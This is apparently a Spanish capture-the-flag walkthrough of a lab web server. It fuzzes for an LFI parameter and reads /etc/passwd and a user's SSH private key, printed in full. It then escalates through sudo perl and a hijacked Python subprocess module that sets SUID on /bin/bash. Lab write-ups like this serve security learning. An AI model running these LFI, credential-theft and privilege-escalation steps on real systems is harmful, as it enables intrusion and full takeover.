```bash
┌──(root㉿38095a406ad0)-[/]
└─# gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,css,js
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              js,php,html,css
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 2596]
/main.css             (Status: 200) [Size: 619]
/assets               (Status: 301) [Size: 309] [--> http://172.17.0.2/assets/]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 1102800 / 1102805 (100.00%)
===============================================================
Finished
===============================================================

```



```bash
┌──(root㉿38095a406ad0)-[/]
└─# ffuf -u "http://172.17.0.2/index.php?FUZZ=" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -mc 500

        /'___\  /'___\           /_\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ __\/\ \/\ \ \ \ __\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://172.17.0.2/index.php?FUZZ=
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 500
________________________________________________

secret                  [Status: 500, Size: 2582, Words: 671, Lines: 63, Duration: 0ms]
:: Progress: [6453/6453] :: Job [1/1] :: 52 req/sec :: Duration: [0:00:05] :: Errors: 0 ::

```

Filtrando por error 500 sabemos que el server esta interactuando pero que no es asi la respuesta, con lo que sabemos que secret puede tener LFI

```bash
┌──(root㉿38095a406ad0)-[/]
└─# wfuzz -c --hc=404 --hw 169 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt http://172.17.0.2/index.php?FUZZ=/etc/passwd
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzzs documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.17.0.2/index.php?FUZZ=/etc/passwd
Total requests: 207643

=====================================================================
ID           Response   Lines    Word       Chars       Payload                      
=====================================================================

000004819:   200        88 L     199 W      3870 Ch     "secret"                     
000023835:   200        62 L     169 W      2596 Ch     "4697"                       

Total time: 0
Processed Requests: 23825
Filtered Requests: 23824
Requests/sec.: 0


```

```bash
`-c`: Muestra la salida en color para facilitar la lectura.

`--hc=404`: "Hide Code" — oculta las respuestas con código HTTP 404 (página no encontrada).

`--hw 169`: "Hide Words" — oculta las respuestas que tienen exactamente 169 palabras en el cuerpo, para filtrar respuestas repetitivas o irrelevantes.

`-t 200`: Define el número de threads (hilos) concurrentes para acelerar el fuzzing, en este caso 200.

`-w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt`: Especifica la wordlist que se usará para fuzzear, en este caso una lista de nombres de directorios o archivos en minúsculas.

`http://172.17.0.2/index.php?FUZZ=/etc/passwd`: La URL objetivo donde se reemplaza `FUZZ` por cada palabra de la wordlist para probar diferentes parámetros o rutas.
```

con Wfuf tambien nos encuentra el LFI, vamos a ejecutarlo dentro de la web

![[Pasted image 20250515094718.png]]

![[Pasted image 20250515094729.png]]

Tenemos un usuario, para iniciar sesion dentro de este usuario si nos damos cuenta en el escaneo, va por claves de rsa, con lo que tenemos que buscar la llave ssh de luisillo para poder entrar con el 

![[Pasted image 20250515095221.png]]

```
-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn NhAAAAAwEAAQAAAYEAvbN4ZOaACG0wA5LY+2RlPpTmBl0vBVufshHnzIzQIiBSgZUED5Dk 2LxNBdzStQBAx6ZMsD+jUCU02DUfOW0A7BQUrP/PqrZ+LaGgeBNcVZwyfaJlvHJy2MLVZ3 tmrnPURYCEcQ+4aGoGye4ozgao+FdJElH31t10VYaPX+bZX+bSxYrn6vQp2Djbl/moXtWF ACgDeJGuYJIdYBGhh63+E+hcPmZgMvXDxH8o6vgCFirXInxs3O03H2kB1LwWVY9ZFdlEh8 t3QrmU6SZh/p3c2L1no+4eyvC2VCtuF23269ceSVCqkKzP9svKe7VCqH9fYRWr7sssuQqa OZr8OVzpk7KE0A4ck4kAQLimmUzpOltDnP8Ay8lHAnRMzuXJJCtlaF5R58A2ngETkBjDMM 2fftTd/dPkOAIFe2p+lqrQlw9tFlPk7dPbmhVsM1CN+DkY5D5XDeUnzICxKHCsc+/f/cmA UafMqBMHtB1lucsW/Tw2757qp49+XEmic3qBWes1AAAFiGAU0eRgFNHkAAAAB3NzaC1yc2 EAAAGBAL2zeGTmgAhtMAOS2PtkZT6U5gZdLwVbn7IR58yM0CIgUoGVBA+Q5Ni8TQXc0rUA QMemTLA/o1AlNNg1HzltAOwUFKz/z6q2fi2hoHgTXFWcMn2iZbxyctjC1Wd7Zq5z1EWAhH EPuGhqBsnuKM4GqPhXSRJR99bddFWGj1/m2V/m0sWK5+r0Kdg425f5qF7VhQAoA3iRrmCS HWARoYet/hPoXD5mYDL1w8R/KOr4AhYq1yJ8bNztNx9pAdS8FlWPWRXZRIfLd0K5lOkmYf 6d3Ni9Z6PuHsrwtlQrbhdt9uvXHklQqpCsz/bLynu1Qqh/X2EVq+7LLLkKmjma/Dlc6ZOy hNAOHJOJAEC4pplM6TpbQ5z/AMvJRwJ0TM7lySQrZWheUefANp4BE5AYwzDNn37U3f3T5D gCBXtqfpaq0JcPbRZT5O3T25oVbDNQjfg5GOQ+Vw3lJ8yAsShwrHPv3/3JgFGnzKgTB7Qd ZbnLFv08Nu+e6qePflxJonN6gVnrNQAAAAMBAAEAAAGADK57QsTf/priBf3NUJz+YbJ4NX 5e6YJIXjyb3OJK+wUNzvOEdnqZZIh4s7F2n+VY70qFlOtkLQmXtfPIgcEbjyyr0dbgw0j4 4sRhIwspoIrVG0NTKXJojWdqTG/aRkOgXKxsmNb+snLoFPFoEUHZDjpePFcgyjXlaYmZ0G +bzNv0RNgg4eWZszE13jvb5B8XtDzN4pkGlGvK1+8bInlguLmktQKItXoVhhokGkp4b+fu 7YjDiaS4CyWsxX50wG/ZMgYBwFLRbCDUUdKZxsmCbreHxLKT/sae64E2ahuBSckYZlIzTd 2lp27EOOPvdPlt9gny83JuFHBLChMd4sHq/oU8vGAiGnIvOCWs4wMArbpJQ+EALJk3GYvh oqWp3Q4N4F1tmwlrbqX2KP2T5yB+rLoBxfJwLELZlzd+O8mfP9Yknaw2vVYpUixUglNWHJ ZnmN1uAScPAd1ZNvIkPm6IPcThj1hVCkFXgWjQn6NdJj+NGNWcBeUrxBkH0vToD7gfAAAA wQCvSzmVYSxpX3b9SgH+sHH5YmOXR9GSc8hErWMDT9glzcaeEVB3O2iH/T+JrtUlm4PXiP kwFc5ZHHZTw2dd0X4VpE02JsfkgwTEyqWRMcZHTK19Pry2zskVmu6F94sOcN8154LeQBNx gT22Dr/KJA71HkOH7TyeGnlsmBtZoa3sqp3co9inkccnhm1KUeduL4RcSysDqXYbBUtNB6 G1l8HYysm8ISCsoR4KSgxmC5lqCMfBy7z/6nOX7sm5/kP+JMsAAADBAO8TiHrYTl/kGsPM ITaekvQUJWCp+FCHK07jwzNp4buYAnO3iGvhVQpcS7UboD8/mve207e97ugK4Nqc68SzSu bDgAnd4FF3NLoXP/qPZPaPS1FRl0pY0jHyB+U6RELgaI34i9AierMc+4M0coUMZvxqay3o t8jRhz08jiwFifszwNN7taclmNEfkrKBY7nlbxFRd2XLjknZHFUOFzOFWdtXilQa+y6qJ6 lKtE9KWnQgIgZB9Wt+M3lsEVWEdQKN1wAAAMEAyyEsmbLUzkBLMlu6P4+6sUq8f68eP3Ad bJltoqUjEYwe9KOf07G15W2nwbE/9WeaI1DcSDpZbuOwFBBYlmijeHVAQtJWJgZcpsOyy2 1+JS40QbCBg+3ZcD5NX75S43WvnF+t2tN0S6aWCEqCUPyb4SSQXKi4QBKOMN8eC5XWf/aQ aNrKPo4BygXUcJCAHRZ77etVNQY9VqdwvI5s0nrTexbHM9Rz6O8T+7qWgsg2DEcTv+dBUo 1w8tlJUw1y+rXTAAAAEnZheGVpQDIzMWRlMDI2NmZmZA== -----END OPENSSH PRIVATE KEY-----
```

Esta es la llave ssh de vaxei, de ahi iremos viendo como escalar a sudo

```bash
┌──(root㉿38095a406ad0)-[/home/Psycho]
└─# ssh -i id_rsa vaxei@172.17.0.2
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.14.5-300.fc42.x86_64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sat Aug 10 02:25:09 2024 from 172.17.0.1
vaxei@7a21777e876e:~$ sudo -l
Matching Defaults entries for vaxei on 7a21777e876e:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User vaxei may run the following commands on 7a21777e876e:
    (luisillo) NOPASSWD: /usr/bin/perl
vaxei@7a21777e876e:~$ sudo -u luisillo perl -e "/bin/bash"
Unknown regexp modifier "/b" at -e line 1, at end of line
Unknown regexp modifier "/h" at -e line 1, at end of line
Execution of -e aborted due to compilation errors.
vaxei@7a21777e876e:~$ sudo -u luisillo /usr/bin/perl -e "/bin/bash"
Unknown regexp modifier "/b" at -e line 1, at end of line
Unknown regexp modifier "/h" at -e line 1, at end of line
Execution of -e aborted due to compilation errors.
vaxei@7a21777e876e:~$ sudo -u luisillo /usr/bin/perl -e 'exec "/bin/bash"'
luisillo@7a21777e876e:/home/vaxei$ sudo -l
Matching Defaults entries for luisillo on 7a21777e876e:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User luisillo may run the following commands on 7a21777e876e:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py
luisillo@7a21777e876e:/home/vaxei$ 

```

Accedo al usuario de luisillo, ahora tengo que sacar la forma de volverme root con el paquete ese de python

```bash
luisillo@7a21777e876e:/opt$ sudo python3 paw.py 
[sudo] password for luisillo: 
sudo: a password is required
luisillo@7a21777e876e:/opt$ /usr/bin/python3 paw.py 
Ojo Aqui
Processed data: tHIS IS SOME DUMMY DATA THAT NEEDS TO BE PROCESSED.
Useless calculation result: 499999500000
Traceback (most recent call last):
  File "/opt/paw.py", line 41, in <module>
    main()
  File "/opt/paw.py", line 38, in main
    run_command()
  File "/opt/paw.py", line 30, in run_command
    subprocess.run(['echo Hello!'], check=True)
  File "/usr/lib/python3.12/subprocess.py", line 548, in run
    with Popen(*popenargs, **kwargs) as process:
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/subprocess.py", line 1026, in __init__
    self._execute_child(args, executable, preexec_fn, close_fds,
  File "/usr/lib/python3.12/subprocess.py", line 1955, in _execute_child
    raise child_exception_type(errno_num, err_msg, err_filename)
FileNotFoundError: [Errno 2] No such file or directory: 'echo Hello!'
luisillo@7a21777e876e:/opt$ export PATH=/opt:$PATH
luisillo@7a21777e876e:/opt$ nano
luisillo@7a21777e876e:/opt$ nano subprocess.py
luisillo@7a21777e876e:/opt$ sudo -u root /usr/bin/python3 paw.py 
[sudo] password for luisillo: 
sudo: a password is required
luisillo@7a21777e876e:/opt$ sudo -u root /usr/bin/python3 /opt/paw.py 
Ojo Aqui
Processed data: tHIS IS SOME DUMMY DATA THAT NEEDS TO BE PROCESSED.
Useless calculation result: 499999500000
Traceback (most recent call last):
  File "/opt/paw.py", line 41, in <module>
    main()
  File "/opt/paw.py", line 38, in main
    run_command()
  File "/opt/paw.py", line 30, in run_command
    subprocess.run(['echo Hello!'], check=True)
    ^^^^^^^^^^^^^^
AttributeError: module 'subprocess' has no attribute 'run'
luisillo@7a21777e876e:/opt$ bash -p
bash-5.2# whoami
root
bash-5.2# cat subprocess.py 
import os
os.system("chmod u+s /bin/bash")
bash-5.2# 

```

Aqui ahora explicare lo que ha pasado, al tener permisos como root para ejecutar el script, lo que he hecho ha sido crear un archivo llamado `subprocess.py` para en vez de buscarlo en el PATH, lo buscase dentro del path, luego de ahi luego he definido que hiciera un `chmod u+s` a `/bin/bash` para tener permisos de ejecucion con cualquiera y de ahi he lanzado un `bash -p ` para hacerme con el control de la maquina haciendo una escalada de privilegios